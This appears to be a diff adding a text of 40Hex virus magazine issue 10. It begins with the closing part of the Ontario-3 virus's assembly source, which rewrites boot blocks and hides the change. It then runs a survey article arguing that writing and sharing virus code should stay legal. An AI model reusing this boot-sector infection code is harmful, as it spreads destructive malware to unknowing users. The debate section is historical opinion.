+                xor     dx,dx   ; calculate new location of boot block
+                mov     ax,word ptr ds:[offset endvirus+13h] ; total sec
+                mov     bx,word ptr ds:[offset endvirus+1Ah] ; sec/track
+                mov     cx,bx
+                div     bx                      ; # track
+                xor     dx,dx
+                mov     bx,word ptr ds:[offset endvirus+18h] ; sec/FAT
+                div     bx
+                sub     word ptr ds:[offset endvirus+13h],cx ; total sec
+                dec     ax
+                mov     byte ptr sectortrack+1,al
+                mov     ax,word ptr ds:[offset endvirus+18h] ; sec/FAT
+                mov     byte ptr sectortrack,al
+                mov     ax,word ptr ds:[offset endvirus+1Ah] ; sec/track
+                dec     ax
+                mov     byte ptr drivehead+1,al
+                mov     byte ptr drivehead,0
+                mov     dx,drivehead            ; move original boot block
+                mov     cx,sectortrack          ; to end of disk
+                mov     bx,offset endvirus
+                mov     ax,301h
+                call    callint13
+                jc      go_exitint13
+                mov     si,offset endvirus+3    ; copy parameters so
+                mov     di,offset bootparms     ; no one notices boot
+                mov     cx,bootsectorentry - bootparms ; block is changed
+                rep     movsb
+                xor     cx,cx
+                mov     dx,cx
+                inc     cx
+                mov     bx,offset bootsector    ; copy virus boot block
+                mov     ax,301h
+                call    callint13
+go_exitint13:
+                jmp     exitint13
+
+callint21:
+                pushf
+                call    dword ptr cs:oldint21
+                retn
+
+callint13:
+                pushf
+                call    dword ptr cs:oldint13
+                retn
+
+oldint13        dd      0
+drivehead       dw      100h
+sectortrack     dw      2709h
+YAM             db      '*YAM*',1Ah
+                db      'Your PC has a bootache! - Get some medicine!',1Ah
+                db      'Ontario-3 by Death Angel',1Ah,1Ah,1Ah,1Ah
+save4:
+origCSIP        db      0CDh, 020h, 0, 0
+origSSSP        dd      0
+
+endvirus:
+
+viruslength     =       $ - decrypt
+
+infCOMMAND      db      ?
+infectSYS       db      ?
+readbuffer      db      01Ch dup (?)
+encryptbuffer   db      viruslength dup (?)
+
+                end     decrypt
+-------------------------------------------------------------------------------
+                                                                             DA
+40Hex Issue 10 Volume 3 Number 1                                      File 009
+
+                            40-hex Survey:
+                  Should Writing a Virus Be Outlawed?
+
+                              by DecimatoR
+
+
+   Recently, while conversing with Garbageheap, I was inspired with the
+idea for this article.  So, with the help of a lot of people in the UseNet
+alt.security and comp.virus newsgroups, I have determined what seems to be
+the answer to my question.  My thanks to all who responded - couldn't have
+done it without ya!
+
+   I posted this message in alt.security and comp.virus:
+
+"Greetings....
+
+  Some of you may read the infamous 40-Hex Virus magazine, published 
+  by us. If so, we'd like your opinions for a survery we're doing.  
+  The results of this survey will be published in 40-hex #10.
+
+  Here are the survey questions.  Please answer them, and respond via 
+  email to me.  You may respond with simple Yes or No answers, or you 
+  may be as wordy as you want.  Please note - ANY response given might 
+  be published in 40-hex magazine.  Now, the questions:
+
+  1) Should it be Federally illegal to write a computer virus?
+
+  2) Should it be Federally illegal to distribute computer viruses, 
+     to KNOWING individuals (ie on "virus" boards)? (This does NOT 
+     mean infecting another person with a virus - it means giving 
+     them a copy of a virus, and making sure they KNOW it is a virus)
+
+  3) If executable virus code is illegal, then should the SOURCE code 
+     to the viruses be illegal to copy, sell, or other wise distribute?
+
+  Please mail me with YOUR opinions to the above, and feel free to 
+  explain your views, or present other opinions you may have.  We are 
+  attempting to get a general idea as to the thoughts of people, 
+  therefore we are posting this to COMP.VIRUS, and ALT.SECURITY, and 
+  any other appropriate newsgroups.
+
+  Please note - we are NOT interested in the legallity of SPREADING 
+  virus code by infection - that IS already illegal.  We are also not 
+  interested in the ethic issues of viruses.  We want your opinions as 
+  to what should be OUTLAWED, and what should be LEGAL.  Of course, any 
+  other opinions you may wish to add are welcome.  
+
+                     Thanks for your time and consideration..
+
+                             --DecimatoR
+                               Phalcon/Skism
+                               40-Hex Magazine Columnist"
+
+
+
+Amazingly, almost all of the responses stated that NO, it _SHOULD_NOT_ be
+illegal to write, or distribute (to knowing persons) a computer virus.  Many
+respondees regarded that as censorship, and wanted nothing of the sort. 
+However, there were a few replies which, while not condoning the outlawing of
+virus creation, also certainly did not condone the authoring or distributing
+of viruses.  There was one man, from England, though, who firmly stated that
+there should be international laws banning the creation of, distribution of,
+and sharing of virus source code.  The fact that only one person responded in
+this manner surprised me.  I expected more.
+
+Here are a few quotes from the responses I got.  There are no names or 
+addresses attatched in most cases.  I posted my original survey question
+through an anonymous mailer,  since I wasn't too sure of the response I'd get,
+and in turn, the responses were also anonymous.
+
+
+******************************************************************************* 
+     1) Should it be Federally illegal to write a computer virus?
+*******************************************************************************
+
+From David:
+
+"Not at all.  The government is already quite behind the times
+ when it comes to legislating technical issues.  I don't believe
+ they are qualified to enact competent legislation.   We're talking
+ about a government who thought Steve Jackson Games should be raided
+ for compiling a cyberpunk roleplaying supplement...
+ 
+ Leaving aside the question of their technical knowledge, it smacks of
+ censorship.  The inception of a computer program is roughly analogous
+ to the writing of a book.  Put this way, your question could be
+ phrased like:
+ 
+        "Should it be Federally illegal to write a [pornographic,
+         anarchistic, insert-favorite-word-here] book?"
+ 
+ We know that the writing of a book is protected by the US constitution
+ as a form of expression.  The writing of a computer program is a similar
+ form of expression, and should thus be inviolate..."
+ 
+                          --------------------------
+
+From: an11445@anon.penet.fi: 
+
+NO!    however, if people do not exhibit ethical behaviour regarding
+       viruses, they are forcing such a law to be made. if someone wants
+       the right to write what they want on their own computer, they
+       would be well advised to not release to any other person this
+       program unless they are -absolutely certain- that person will :
+ 
+       a. not use the program for any damaging purpose
+       b. not use the program to play tricks on people
+       c. not allow the program to leave his/her hands without
+          ensuring the above conditions are met.
+ 
+                         --------------------------
+
+From: an10445@anon.penet.fi (Cutthroat):
+
+No.
+A virus is simply a section of code that travels with another section of code.
+Viruses are not inherently malicious.
+ 
+                         --------------------------
+
+From: an2284@anon.penet.fi
+ 
+>  1) Should it be Federally illegal to write a computer virus?
+ 
+No.  It's just code.  The minute you start outlawing one kind of program,
+you've introduced censorship.
+
+                         --------------------------  
+
+From: an11290@anon.penet.fi: (Roger)
+ 
+>  1) Should it be Federally illegal to write a computer virus?
+ 
+Hard one. The problem is that I'd like it to be legal: people should
+be free to experiment with this kind of stuff providing they keep it
+safe in their own environment. However when parallels are
+sought with current law, we are forced to another conclusion:
+selling a gun is potentially harmless untill the gun is used. It's
+partly the responsibility of the SELLER to keep guns from spreading
+to unqualified people.
+ 
+Now the question rises: can a computer Virus be compared to a GUN.
+I think it can: both are harmless until employed in a dangerous
+fashion.
+ 
+In short computer viruses provide a threat to our society. Current
+law prohibits possession of objects that pose a threat to society.
+(Partly because this makes it easier to prosecute people that most
+likely want to employ these objects in a bad way).
+ 
+
+                         --------------------------  
+
+From: Josh@lehigh
+ 
+   Absolutely not.  It's a crummy, unethical, lousy, rotten, thing to do,
+   but making it illegal to write *any* type of a computer program is
+   reminiscent of George Orwell's "1984" and Big Brother.  There is also
+   too much speculation as to what a clear-cut, 100% absolute definition
+   of a computer virus is.  If it's just something that remains in memory
+   and does something the user is not fully aware of, you're eliminating
+   a significant number of useful programs such as disk caches and even
+   virus scanners--how many people are fully aware of the mechanical
+   workings of a virus scanner or a disk cache?  Other definitions can
+   be twisted in similar manners, making just about everything a "virus"
+   in some aspect.
+ 
+
+                         --------------------------  
+
+From Oliver in the UK:
+
+I believe that it should not only be Federally illegal, but Internationally
+illegal to write a computer virus. However, one should look at the
+difficulty of enforcing such a law. From what point onwards does
+a program qualify as a virus; those questions, looking at the heated
+regular debate on virus-l, are far from being answered categorically.
+The bottom line, IMHO, is that enforcement of a federal law against
+computer viruses writing is very hard. Moreover, most academic and
+company sites forbid their users in using computing facilities for
+writing viruses anyway, and it should be up to them to make sure
+locally that no viruses are written on their facilities.
+
+                         --------------------------  
+
+From Jay:
+ 
+Of course not, this is a first amendment right in the USA.  Writing a
+virus is no different than writing any other computer program.  Many
+"normal" computer programs share common coding methods with viruses.
+Who is to say that you intend malice by writing a small chunk of
+software?  Are we supposed to sit down and have code reviews with
+federal agents in random spot checks to make sure we aren't writing
+malicious code?  That's silly.
+
+
+                         --------------------------  
+
+From Ed:
+ 
+    No. This is not the correct way to deal with the virus problem.
+  Any form of restriction placed upon what someone does with their own
+  computer would be unconstitutional, as it removes our personal rights.
+  It has been said that the more numerous the laws, the more corrupt the
+  state. As the law stands, you can do what you want out *your* computer,
+  but as soon as you infect *mine* it becomes illegal, and that is the
+  way it must remain, or else the rights of everyone will be damaged.
+
+
+*******************************************************************************
+     2) Should it be Federally illegal to distribute computer viruses,
+        to KNOWING individuals (ie on "virus" boards)? (This does NOT
+        mean infecting another person with a virus - it means giving
+        them a copy of a virus, and making sure they KNOW it is a virus)
+*******************************************************************************
+
+David:
+
+"Again, no.  The distribution of information should be constitutionally
+ protected.  There are legitimate reasons why someone may want or need
+ the source or executable form of a virus.  The most obvious is in the
+ field of virus research.  It is necessary to obtain the virus in question
+ in order to devise a vaccine for it.  Security through obscurity
+ has been tried before; it's great until some "unauthorized" person
+ gets hold of some information others are hiding.  He's free to use
+ it to great success because the legitimate users don't know exactly
+ what he's got, making it hard to devise a defense.
+ 
+A good example of this type of argument might be:
+        Criminals have guns.  It should be illegal to have
+        a gun.  In fact, let's keep the "knowing individuals"
+        (ie. the police) from having them too... "
+
+                           ___________________________
+
+From: an11445@anon.penet.fi:  
+ 
+just because you make sure they KNOW it's a virus does not mean they
+will not do some destructive thing with it, perhaps even unintentionally.
+in my paper, 'circular time line model for addressing the impact of virus
+exchange bbs', i support the conclusion that it will not especially help
+to do this, and that it may not be even the most efficient way to deal
+with the problem of computer viruses.
+ 
+if people will not do the things that are right, however, they force
+people to do the things that are wrong, in this case.
+
+                           ---------------------------
+
+From: an10445@anon.penet.fi (Cutthroat):
+
+No.
+A weak system can be hit by a virus.  A strong system is less likely to
+ be hit by a virus.
+Make computers more secure.  Viruses will always exist.
+
+                           ---------------------------  
+
+From: an2284@anon.penet.fi
+ 
+>  2) Should it be Federally illegal to distribute computer viruses,
+>     to KNOWING individuals (ie on "virus" boards)? (This does NOT
+>     mean infecting another person with a virus - it means giving
+>     them a copy of a virus, and making sure they KNOW it is a virus)
+ 
+Nope.  It's just *executable* code this time.  :-)
+
+                           ---------------------------  
+
+From: an11290@anon.penet.fi: (Roger)
+
+>  2) Should it be Federally illegal to distribute computer viruses,
+>     to KNOWING individuals (ie on "virus" boards)? (This does NOT
+>     mean infecting another person with a virus - it means giving
+>     them a copy of a virus, and making sure they KNOW it is a virus)
+ 
+Following the reasoning in the answer to the last question: yes. However
+I think there is a difference between distributing the actual code and
+only pseudo code. It's like telling someone the principle of an atom bomb,
+or sending him a "do  it yourself kit". The last is certainly beyond the
+limit, whereas the first isn't.
+
+                           ---------------------------  
+
+From Josh@lehigh:
+
+   Doing so would absolutely cripple virus-fighting developments.  If a
+   user cannot legally send a virus-infected program to the author of a
+   virus scanner/cleaner, it becomes impossible for the utility to detect
+   and/or remove that type of virus unless the author somehow becomes
+   accidentally infected by it.
+
+
+                           ---------------------------  
+
+From Oliver in the UK:
+
+>   2) Should it be Federally illegal to distribute computer viruses,
+>      to KNOWING individuals (ie on "virus" boards)? (This does NOT
+>      mean infecting another person with a virus - it means giving
+>      them a copy of a virus, and making sure they KNOW it is a virus)
+ 
+Yes. Virus boards, etc. are all nests for hackers-crackers & people
+envolved in the "computer-underworld". Distribution of sources on
+BBS to knowing individuals can only add to the spread of computer
+viruses. In addition to that, so many people would then be able to
+modify the original source code, that one would end-up with a
+virtually unlimited number of variants of each virus - definitely
+the horror scenario.
+
+                           ---------------------------  
+
+From Paul Ferguson:
+ 
+   That depends. If it can be proven in a court of law that the
+   provider of the computer virus knew before-hand that recipient
+   would irresponsibly allow it to pass into the hands of someone
+   who would a.) willingly transplant it into an unsuspecting public
+   domain or b.) modify it and then release it into an unsuspecting
+   public domain, then YES, I believe that is wrongful action that
+   should be illegal. If the program (virus) is passed amongst two
+   trusted individuals with little or no chance of it "escaping"
+   into the public domain, then that is a matter of personal
+   transaction which does not affect other computerists.
+
+
+                           ---------------------------  
+
+From Jay:
+
+>   2) Should it be Federally illegal to distribute computer viruses,
+>      to KNOWING individuals (ie on "virus" boards)? (This does NOT
+>      mean infecting another person with a virus - it means giving
+>      them a copy of a virus, and making sure they KNOW it is a virus)
+ 
+Of course not, if you write a note on a piece of paper and share it with
+a friend, is that a federal offense?  What if that note contains information
+that could show your friend how to kill someone?  What if the note contains
+a beautiful little poem that happens to describes how to kill someone?
+Software is a vehicle for expressing an idea or concept, no different from
+the written word.  If there is no malice, there is no crime.  It's not
+illegal to infect someone with a virus if you don't know that you passed
+it along, so why should it be illegal to give away a virus to someone
+who can handle it?
+
+
+                           ---------------------------  
+
+From Ed:
+
+> Should the distribution of viruses to knowing individuals be illegal?
+ 
+    Again, no. One reason is that I doubt very many virus authors would
+  heed such a law, and so only the anti-virus community would suffer,
+  making conditions worse. Another reason is the First Ammendment of the
+  Constitution of the United States, which guarantees freedom of speech
+  to everyone. Distribution of viral code is a form of speech, as it is
+  a transfer of data and information. If it weren't for virus transactions,
+  no one virus scanner would be very complete, as each would only detect
+  a handful of viruses, and one would have to obtain a copy of every scanner
+  to have a complete detection system.
+
+
+
+*******************************************************************************
+     3) If executable virus code is illegal, then should the SOURCE code
+        to the viruses be illegal to copy, sell, or other wise distribute?
+*******************************************************************************
+
+David: 
+"I don't agree that either should be illegal, but outlawing the source
+ would make it much more difficult to devise a defense.  It's an extension
+ of the above argument..."
+
+                          ---------------------------- 
+
+From: an11445@anon.penet.fi:  
+
+  >> 3) If executable virus code is illegal, then should the SOURCE code
+  >>    to the viruses be illegal to copy, sell, or other wise distribute? 
+
+If, then; else not. but should be not to begin with.
+
+                          ----------------------------
+
+From: an11184@anon.penet.fi
+ 
+The answers arise from my views about individual freedom for every human.
+Governments should interfere as little as possible in this.
+
+                          --------------------------- 
+
+From: an10445@anon.penet.fi (Cutthroat):
+
+No.
+A virus is less likely to be "accidently" released if it exists only
+ as source code.
+Viruses are much easier to study for "legitimate" security purposes
+ if it is released as source code.
+
+                          --------------------------- 
+
+From Josh@lehigh:
+ 
+   For similar reasons to 1) above, the thought is abhorrent.  Taking an
+   extreme example, suppose I was to write a compiler.  The source code
+   for this compiler consists of any text file, and its output is a file
+   infector which randomly stamps the source code (text file) on someone's
+   hard drive.  Therefore, your resume, your letters--in short, any text
+   you have whatsoever--becomes source code for a virus.  Big brother
+   returns--and with a vengeance.
+
+                          --------------------------- 
+
+From Oliver in the UK:
+
+>   3) If executable virus code is illegal, then should the SOURCE code
+>      to the viruses be illegal to copy, sell, or other wise distribute?
+ 
+See the answer to 2. The SOURCE code is even more lethal than the
+executable. The only way that such code would be transfered, should
+be for research purposes. I am talking here about serious scientific
+research. The more people that have access to source viral code, the
+more likely it is for non-authorised people to have access to it.
+In scientific research, a researcher has access to chemicals & data
+which (s)he is often not entitled to take out of the lab. The same
+should be for viral code.
+ 
+The argument of making Viral Code available to the public "because this
+is the only way to get to know about computer viruses" is hence a
+stupid argument. The sole purpose of releasing viral source code to
+the public is misleadingly "for informational purposes only" and can
+alas only lead to further propagation of the virus itself, as well as
+new variants.
+
+                          --------------------------- 
+
+From Paul Ferguson:
+
+   Executable code of any kind should not ever (and will not, IMHO)
+   be illegal. That is absurd. It is the use of said code that would
+   constitute a violation of another's practice of safe computing. If
+   this code (viruses) are released into the public domain, I consider
+   it a practice of reckless computing. Hey, we have laws against
+   reckless driving and reckless endangerment, why not reckless
+   computing?
+ 
+
+                          --------------------------- 
+
+From Jay:
+
+>   3) If executable virus code is illegal, then should the SOURCE code
+>      to the viruses be illegal to copy, sell, or other wise distribute?
+ 
+Executable code shouldn't be illegal.  Is it illegal to translate a book
+from English to Spanish?  Can you translate a book from English to Spanish
+without knowing either language?  You CAN convert source code to executable
+code without knowing the source language, or assembly/machine code.
+ 
+Let's assume that I was to give a computer illiterate friend, a floppy
+containing source code to computer mortgage payments, a public domain
+compiler, and instructions for compiling the application, "type MAKE".
+Lets also assume that I received the source code from someone else, and
+the code contained a virus hidden in the source (in source code form) that
+I was unaware of.  If the friend follows the instructions, and compiles
+the virus did he break the law?  He thought he was just getting a program
+to calculate mortgage payments.  Am I guilty of a crime?  I just gave a
+friend some innocent source code.  This is ludicrous.
+ 
+If source code for a virus causes no problems for either the giver or
+receiver, why should it be banned?  If I write a book that contains a
+series of instructions that detail a plan to overthrow the US goverment,
+is that a crime?  If I sell the book, is that criminal?  Tom Clancy does
+it...he sells millions.  If I write a book that details instructions
+for overthrowing MSDOS, is that crime?  What if I choose distribute it
+electronically?
+ 
+This is all stupid, prohibiting information doesn't work.
+ 
+The bottom line is that if an act was done with malice, there may
+be a crime, if the act was done without malice, there is no crime.
+
+
+                          --------------------------- 
+
+From Ed:
+
+> If executable virus transfer is made illegal, should source code be
+> restricted as well?
+ 
+    I would prefer that neither are made illegal, but if this situation were
+  to arise, I would have to say no. Source code qualifies for the First
+  Ammendment more so than viral samples. Now, I'm not saying it's justified
+  to go and give source code to anyone who asks for it, after all why do you
+  think there are so many variants of Vienna and Pixel? But legal action used
+  to restrict the actual transactions of viral material is not a valid course
+  of action, practically or ethically.
+  
+  I can not condone distribution of viral samples to anyone who asks for it
+(especially "Nuke-EM!!" types), however I've found that many anti-viral
+researchers simply can't obtain the samples they need because they aren't in
+the "inner circle" of trusted anti-virus vendors. It's a very difficult
+issue to deal with, as to how to deal with virus distribution, such as
+who should be allowed to procure the viruses they need, and who shouldn't.
+It's an ethical and moral delemma, but one this is for sure, it should not
+be illegal!
+
+
+***************************************************************************** 
+   Please mail me with YOUR opinions to the above, and feel free to
+   explain your views, or present other opinions you may have. 
+***************************************************************************** 
+
+From: an11445@anon.penet.fi:   
+ 
+There are already enough laws in existance. we do not need more laws.
+we need people who know how to interpret the existing laws in light of
+the societal and technological changes in our society.
+ 
+                          --------------------------- 
+ 
+From Marc:
+
+        There is no statement of illegality in this domain that
+        wouldn't lead inexorably to the licensing of anti-virus
+        software developers and the stifling of most forms of
+        independent research into system security. You would end up
+        with the same kind of idiocy that makes it impossible to use
+        certain drugs as medicines or even to do research with them.
+        You would also end up having to give the police extraordinary
+        powers to enable enforcement, as in all cases of victimless
+        crime.
+
+                          --------------------------- 
+
+----------------------------------------------------------------------------
+Note From DecimatoR:  The following conversation was between myself and
+Oliver, the one person who stated that everything dealing with the creation
+of viruses should be internationally controlled.  Since his opinions differed
+so strongly from mine, and most of those I recieved, I chose to include our
+conversation here, unedited.  I appreciate the time he took in corresponding
+with me.  Thanks, guy.
+----------------------------------------------------------------------------
+
+(The quoted text is from me, the others from him.  Like you couldn't tell)
+
+From Oliver:
+ 
+Hello,
+    I got your 2 emails regarding the fact that I was the only
+person to favour a full clampdown on viruses etc.
+Let me answer the direct questions in your 2 emails:
+ 
+>Your response so far has been the only one which out-and-out said that YES,
+>viruses, source code for them, etc should be internationally illegal.  I
+>actually thought there would be more opinions like yours, however this seems
+>not to be the case.  So, if you don't mind, I'd like a little more insight
+>into your ideas.  I noticed you were from London, where there have recently
+>been arrests of people who write and sell viruses.  I assume you agree that
+>the government has the right to make such an arrest.  My question to you:
+ 
+Yes, I agree with the government regarding those arrests.
+ 
+>where do you draw the line regarding censorship?  Many respondents claimed
+>that banning the writing of viruses would be censorship, to an extreme they
+>are NOT willing to tolerate.  You think differently.  So, where do you think
+>the line should be drawn?  With viruses?  Maybe "trojanized" code?  Or code
+>that will disable itself after x number of runs?
+ 
+This is a very difficult line to draw. I think that the first selection that
+one must make is whether the code is to destroy data, or will simply
+replicate (like a worm). The easiest piece of code to look at is trojanized
+code. Its sole purpose is usually to destroy data.  I qualify purpose-
+made trojanized code as malicious vandalism. In addition to that,
+"trojanization" of a commercial or public domain program itself already
+breaks the law due to copyright infringements and/or license breaches.
+Viruses are, also by definition, data destructors. Anyone writing a virus
+and planning to distribute it should hence also be breaking the law.
+Worms are supposed not to destroy data; however let us consider the fact
+that a worm spreads on computer systems and a bug in the worm's code
+corrupts user data. What I am trying to get to is the fact that worms
+spread in people's machines without their approval, and I find this to
+be morally wrong. Compare this with, say, skeleton keys of apartments
+in a town. Would you support the idea of making skeleton keys, exchanging
+them on "skeleton-key-BBS" legal ? It would mean that it's legal for anyone
+to have skeleton keys and use them to "visit" apartments at will.
+So here, we are reaching  the fact that a computer's HD has now grown
+to be part of someone's house, someone's belongings, someone's living
+space, and that any breach of privacy is unwelcome. Since worms breach
+that privacy, then wouldn't it be a protection for the public to
+outlaw those worms ? So I support the fact of making all code that
+self-replicates from system to system illegal.
+ 
+ 
+>Doesn't the intervention of the government in such areas bother you?  If
+>not, why not?  Obviously your opinions are quite different than mine. 
+ 
+No. The government has many duties towards the people of a country, and
+one of them is protection of the people themselves. Remember, I am
+not asking for the government to censor ideas, I am asking for it to
+stop propagation of malicious items; people often refer to this as
+censorship since we're talking about intellectual data, but this is
+a big mistake. I believe that freedom will be more easily enforceable
+if simple basic laws of morals can be enforced.
+Consider gun laws:
+- in UK, gun laws are very tough indeed. No individual is allowed to
+carry a gun without special permits, and those are extremely hard to
+obtain. Individuals allowed to carry a gun are usually under threat
+from terrorism, etc. Those are very isolated cases. As a result, the
+British police is mostly still unarmed. The number of gun-related
+offenses is very low indeed, and any injury is usually caused by knives.
+As a result, repression from the British police needs not be so strong.
+- in USA, in some states, gun laws are very relaxed. Gun-related offenses
+are high, and the US police needs to carry guns as well. The amount of
+repression used by the police has to be much higher than elsewhere.
+I was shocked to hear that police in USA had their gun out when stopping
+a car for speeding. How "friendly" does that make them ?
+Pro-gun individuals would immediately shout that any clamping-down on
+guns is a breach of their freedom, etc. etc. And they even have an
+advantage over pro-virus-enthusiasts that they can argue that the gun
+is for their safety, while I can't think of a positive use for a virus.
+ 
+>is a good thing, because I am looking for differing points of view.  I
+>consider England to be far too strict in censorship, and government control.
+>It would really bother me to have to put up with that kind of control over
+>my life.  Yet you seem to agree with it.  
+ 
+Agreed, there are a few things which the UK government censors that I
+don't agree with. But take, for example, the freedom of the press:
+- Should newspapers have the right to write *anything* about *anyone* ?
+Freedom of speech in this case is only possible if newspaper editors
+are reasonable about what they write. But what often happens is that
+editors praise their "freedom of speech" and allow defammatory articles,
+made-up of lies, etc., thus hurting individuals to such an extent that
+those individuals may have their life affected by that so-called "freedom-
+of-speech" forever.
+Full open democracy, full freedom of speech, full openness only works when
+everybody is nice and kind, and no-one is malicious etc. But this unfortu-
+nately isn't the case in real life. Censorship has to be applied in areas
+which could hurt more people than help them.
+ 
+ 
+>like your answers to a few more in-depth questions.  First of all, many who
+>responded said that banning viruses would be a form of censorship, one which
+>they would not be willing to tolerate.  How would you reply to this?
+ 
+Censorship applies both to intellectual ideas, as well as material ideas.
+The only thing that people make mistakes about is believing that censorship
+of intellectual ideas is bad, and censorship of things (something which
+may be dangerous to them - say a chemical) is okay. The big mistake made
+is to think that intellectual ideas may not hurt them. Computer viruses
+are thought of as intellectual ideas, and thus people usually adopt a
+soft policy towards them by thinking that it cannot hurt them.
+ 
+>ALso, I believe you are from England, what do you think of the recent raids
+>on virus writers, and the man who was selling virueses in your country?
+>Good?  Bad?
+ 
+I completely agree with the government on those matters. What good to society
+are virus writers ? Their sole purpose was to spread their viruses
+worldwide. Their initial statement (which I didn't keep a copy of,
+unfortunately, thinking it was a joke) was so childishly written, I
+could not believe it, but let's not divert to talk about the personality
+of some virus writers. The fact is clear: Viruses can do more harm than
+a lot of other things in life. Have you ever witnessed someone who has
+made no backup of his work, and has had much of his work destroyed by
+a virus ? We aren't talking here about a corrupted copy of Windows 3.1
+that can be re-installed in 30 minutes but about 1 week's original
+work from somebody. I personally haven't been hit, but I have seen people
+in the labs here, and believe me, it's time we stop treating virus-writers
+as "joyful hackers" that do this for fun.
+ 
+>And lastly, a question: do you write computer programs?  If so, then doesn't
+>it bother you knowing that you are _not_allowed_ to write a certain KIND of
+>program, simply because the government considers it "bad"? 
+ 
+I write computer programs daily, in the course of my research (which is
+unrelated to viruses). I use my programming skills to develop systems
+not only for my benefit but also for the benefit of mankind, through
+better future telecommunication systems. My competence in programming
+is high enough to write viruses, trojans, etc. but I am not attracted to
+it whatsoever. If those programming geniuses (aka virus writers), devoted
+their programming time to other activities than virus writing, than
+perhaps they would be able to make something out of their life, instead
+or ruining other people's.
+But let's imagine that I was interested in writing a virus. Who would know ?
+If I wrote a virus on my PC at home, and not release it, not publicize it,
+not mention it to anyone, who would know ? If then I made a mistake,
+and transfered it (against my will) to my computer at work, and infected
+computers all around the place, then whose fault would it be ? Mine.
+I would then have to be ready to face the consequences.
+ 
+>think censorship and banning of code should go?  And, for those who violate
+>the bans, what punishment do you believe is suitable?
+ 
+Banning of the code, IMHO, should be as far as public posting of the
+source on BBS, distribution by any means, infection of any computer.
+I am hesitating about banning the publication of flow charts for the
+code, since this would involve a fair amount of work from potential
+copycats. But banning of full-working virus sources is certainly a
+priority.
+I am not a lawyer, so it would be hard for me to expand on the form of
+punishment for those violating the bans. I think that each case should
+have to be taken separately, depending on the potential danger of
+each piece of code, and also on the damage already inflicted (if any)
+before the trial.
+  
+Cheers,
+ 
+   Oliver
+
+
+                          -------------------------- 
+                             Final note from Dec:
+                          -------------------------- 
+
+
+All in all, the majority response was that no, the coding of and distributing 
+of virus code should _not_ be outlawed in the United States.  Of course, I 
+certainly feel the same way.  The government should NOT be able to say that 
+any piece of code, no matter what the purpose or possible use may be, should 
+not be written.  Programming is freedom of expression, and to some, even art.  
+To limit that with laws and stipulations not only takes away the rights of ALL 
+Americans, but goes against the freedoms that America was founded upon.  
+
+No matter what your point of view on viruses - be they ethical, unethical, 
+whether you write them or hunt them down and destroy them, I truly hope you 
+would never want them to be outlawed.  
+
+Of course, I should mention my views concerning the spreading of viruses to 
+unknowing users.  I firmly believe that such action IS unethical, and, quite 
+simply, wrong.  And yes, that action SHOULD be made illegal.  Many of the 
+respondees to my post compared the legallities of viruses with those of 
+firearms.  While this may be a valid comparison in some cases, in others it is 
+quite unrealistic.  Most who used this idea said that virus code should be 
+restricted to those responsible enough to handle it, just like guns are 
+restricted to those who are responsible.  I have a small problem with this.  
+Firearms are restricted because they can be used to cause serious or fatal 
+injuries.  No computer virus can be used to kill another person.  However, no 
+gun actually KILLS another person.  People kill people, the gun is simply an 
+instrument used.  Maybe a knife would be a better comparison.  Just becuase 
+murders are committed with knives, should we restrict them?  OR ban them 
+outright?  No, of course not.  Same with viruses.  Although they have the 
+potential to be used in destructive ways, they should not be banned.  The 
+people who abuse them should be treated as the criminals they are.  The people 
+who create and help educate others with them should not be treated as 
+criminals.  
+
+We in Phalcon/Skism all believe in the freedom of information, and the right 
+that each and every American has to his own opinions.  Yes, we've written 
+viruses, and yes, we have no qualms about distributing virus code.  (This 
+magazine is one good example)  No one will be injured through our actions, 
+because we simply cranked out this 100% ascii text magazine.  We don't spread 
+our creations intentionally.  We do distribute them to those who want them, 
+and sometimes people do spread them.  We cannot control the actions of others.  
+Breaking the law is wrong.  We don't break the law by programming.  We don't 
+break the law by sharing code.  Don't hold us responsible for those who use 
+our creations to break the law.  After all, you wouldn't hold Smith and Wesson 
+responsible for a crime committed using one of their firearms, would you?  No.  
+Nor would you hold GMC, Inc. responsible for a death caused by a drunk driving
+one of their vehicles.  They were not at fault for creating the vehicle.  The
+drunk was at fault for acting the way he did.  Same goes for viruses, and virus
+authors.  Don't place the blame on the wrong party.  There is a strong
+difference between creation and abuse.  
+
+Next time you ponder the legality of virus writing, think about this.  You 
+wouldn't want cars banned just because a few people don't handle them 
+responsibly.  Attack the criminal, not the creator.  And NEVER take away a 
+person's right to create.
+                                --DecimatoR
+                                  Phalcon/Skism
+
+Author's Note:
+
+This article is dedicated to the members of the ARCV, a England based group of
+virus authors, who were arrested, jailed, and had their equipment confiscated,
+simply because they chose to express themselves through the creation of self-
+replicating code.  This is also dedicated to the man arested by Scotland Yard
+on December 10th, for advertising to sell virus code in the UK.
+
+I hope to God that NEVER would ANYONE in America need to fear for their
+freedom, simply because they chose to program a computer or sell public domain
+code.
+ 
+</pre>
+</html>
+
